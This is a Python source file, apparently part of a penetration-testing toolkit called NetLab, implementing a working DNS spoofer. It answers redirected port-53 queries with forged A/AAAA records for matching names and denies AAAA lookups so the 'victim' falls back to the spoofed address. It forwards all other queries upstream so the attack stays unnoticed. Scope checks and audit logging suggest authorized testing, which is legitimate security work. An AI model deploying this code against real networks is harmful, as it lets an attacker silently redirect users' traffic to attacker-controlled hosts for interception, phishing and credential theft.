"""A DNS responder that answers for the names it was told to, and only those.

Redirecting udp/53 through this process puts NetLab in front of every name
lookup the victim makes.  Names that match a spoof rule are answered with the
configured address; every other query is forwarded to the real resolver and
the real answer is handed back unmodified, because a spoofer that also breaks
the names it was not asked about is just an outage.

The reply goes out on the socket the query arrived on.  netfilter's
connection tracking rewrites the source back to the resolver the victim
actually addressed, so the answer looks like it came from there.
"""

from __future__ import annotations

import fnmatch
import logging
import socket
import struct
import threading
import time

log = logging.getLogger("netlab.dns")

QTYPE_A = 1
QTYPE_NS = 2
QTYPE_CNAME = 5
QTYPE_AAAA = 28
QTYPE_NAMES = {1: "A", 2: "NS", 5: "CNAME", 12: "PTR", 15: "MX", 16: "TXT",
               28: "AAAA", 33: "SRV", 65: "HTTPS"}


def parse_question(data: bytes):
    """Return (transaction_id, qname, qtype, question_end) or None."""
    if len(data) < 12:
        return None
    txid, flags, qdcount = struct.unpack_from("!HHH", data, 0)
    if qdcount < 1 or (flags & 0x8000):          # a response, not a query
        return None
    pos = 12
    labels = []
    while pos < len(data):
        length = data[pos]
        if length == 0:
            pos += 1
            break
        if length & 0xC0:                        # compression in a question
            return None
        pos += 1
        if pos + length > len(data):
            return None
        labels.append(data[pos:pos + length].decode("latin-1", "replace"))
        pos += length
        if len(labels) > 64:
            return None
    if pos + 4 > len(data):
        return None
    qtype, qclass = struct.unpack_from("!HH", data, pos)
    return txid, ".".join(labels), qtype, pos + 4


def build_response(query: bytes, question_end: int, qname: str, qtype: int,
                   address: str, ttl: int = 60) -> bytes | None:
    """An authoritative-looking answer carrying one A or AAAA record."""
    try:
        if qtype == QTYPE_A:
            rdata = socket.inet_aton(address)
        elif qtype == QTYPE_AAAA:
            rdata = socket.inet_pton(socket.AF_INET6, address)
        else:
            return None
    except OSError:
        return None

    txid = struct.unpack_from("!H", query, 0)[0]
    flags = 0x8180                               # response, recursion available
    header = struct.pack("!HHHHHH", txid, flags, 1, 1, 0, 0)
    question = query[12:question_end]
    answer = (b"\xc0\x0c"                        # pointer to the question name
              + struct.pack("!HHIH", qtype, 1, ttl, len(rdata)) + rdata)
    return header + question + answer


def build_nxdomain(query: bytes, question_end: int) -> bytes:
    txid = struct.unpack_from("!H", query, 0)[0]
    header = struct.pack("!HHHHHH", txid, 0x8183, 1, 0, 0, 0)
    return header + query[12:question_end]


class SpoofRule:
    """One pattern and the address it resolves to. `*` matches any name."""

    __slots__ = ("pattern", "address", "hits", "enabled")

    def __init__(self, pattern: str, address: str, enabled: bool = True) -> None:
        self.pattern = (pattern or "*").strip().lower()
        self.address = (address or "").strip()
        self.enabled = enabled
        self.hits = 0

    def matches(self, name: str) -> bool:
        if not self.enabled:
            return False
        name = name.lower().rstrip(".")
        if self.pattern in ("*", "any"):
            return True
        if self.pattern.startswith("*."):
            base = self.pattern[2:]
            return name == base or name.endswith("." + base)
        return fnmatch.fnmatch(name, self.pattern)

    def to_dict(self) -> dict:
        return {"pattern": self.pattern, "address": self.address,
                "enabled": self.enabled, "hits": self.hits}


class DnsSpoofer:
    """UDP responder for redirected port 53 traffic."""

    def __init__(self, listen_port: int, upstream: str = "", rules=None,
                 on_event=None, audit=None, scope=None,
                 upstream_timeout: float = 3.0) -> None:
        self.listen_port = int(listen_port)
        self.upstream = upstream or "1.1.1.1"
        self.upstream_timeout = upstream_timeout
        self.rules: list[SpoofRule] = list(rules or [])
        self.on_event = on_event
        self.audit = audit
        self.scope = scope

        self.queries = 0
        self.spoofed = 0
        self.forwarded = 0
        self.errors = 0

        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._lock = threading.Lock()

    # ----------------------------------------------------------- lifecycle

    def set_rules(self, rules) -> None:
        with self._lock:
            self.rules = list(rules)

    def start(self) -> int:
        if self._thread and self._thread.is_alive():
            return self.listen_port
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", self.listen_port))
        self.listen_port = sock.getsockname()[1]
        sock.settimeout(0.5)
        self._sock = sock
        self._stop.clear()
        self._thread = threading.Thread(target=self._serve, name="dns-spoof",
                                        daemon=True)
        self._thread.start()
        if self.audit:
            self.audit.record("dns.spoof.start", port=self.listen_port,
                              upstream=self.upstream,
                              rules=[r.to_dict() for r in self.rules])
        return self.listen_port

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None
        if self.audit:
            self.audit.record("dns.spoof.stop", queries=self.queries,
                              spoofed=self.spoofed, forwarded=self.forwarded)

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    # --------------------------------------------------------------- serve

    def _serve(self) -> None:
        while not self._stop.is_set():
            sock = self._sock
            if sock is None:
                return
            try:
                data, peer = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(target=self._handle, args=(data, peer),
                             daemon=True).start()

    def _handle(self, data: bytes, peer) -> None:
        self.queries += 1
        parsed = parse_question(data)
        if parsed is None:
            self._forward(data, peer, "", 0)
            return
        _txid, qname, qtype, qend = parsed
        client_ip = peer[0]

        rule = None
        with self._lock:
            for candidate in self.rules:
                if candidate.matches(qname):
                    rule = candidate
                    break

        # A rule is still gated on the engagement: a name is only spoofed for
        # a client that is in scope.
        if rule and self.scope is not None and not self.scope.contains(client_ip):
            rule = None

        if rule and qtype in (QTYPE_A, QTYPE_AAAA) and rule.address:
            reply = build_response(data, qend, qname, qtype, rule.address)
            if reply:
                rule.hits += 1
                self.spoofed += 1
                self._send(reply, peer)
                self._emit("dns.spoofed", {"client": client_ip, "name": qname,
                                           "type": QTYPE_NAMES.get(qtype, str(qtype)),
                                           "answer": rule.address,
                                           "pattern": rule.pattern})
                if self.audit:
                    self.audit.record("dns.spoof", client=client_ip,
                                      name=qname, answer=rule.address,
                                      pattern=rule.pattern)
                return
        if rule and qtype == QTYPE_AAAA and not rule.address:
            # Deny AAAA so the victim falls back to the spoofed A record.
            self._send(build_nxdomain(data, qend), peer)
            return
        self._forward(data, peer, qname, qtype)

    def _forward(self, data: bytes, peer, qname: str, qtype: int) -> None:
        try:
            up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            up.settimeout(self.upstream_timeout)
            try:
                up.sendto(data, (self.upstream, 53))
                answer, _ = up.recvfrom(8192)
            finally:
                up.close()
        except OSError as exc:
            self.errors += 1
            log.debug("dns forward failed for %s: %s", qname, exc)
            return
        self.forwarded += 1
        self._send(answer, peer)
        if qname:
            self._emit("dns.forwarded", {"client": peer[0], "name": qname,
                                         "type": QTYPE_NAMES.get(qtype, str(qtype))})

    def _send(self, payload: bytes, peer) -> None:
        sock = self._sock
        if sock is None:
            return
        try:
            sock.sendto(payload, peer)
        except OSError:
            self.errors += 1

    def _emit(self, name: str, data: dict) -> None:
        if self.on_event:
            try:
                self.on_event(name, data)
            except Exception:                    # pragma: no cover
                pass

    def stats(self) -> dict:
        return {"queries": self.queries, "spoofed": self.spoofed,
                "forwarded": self.forwarded, "errors": self.errors,
                "port": self.listen_port,
                "rules": [r.to_dict() for r in self.rules]}
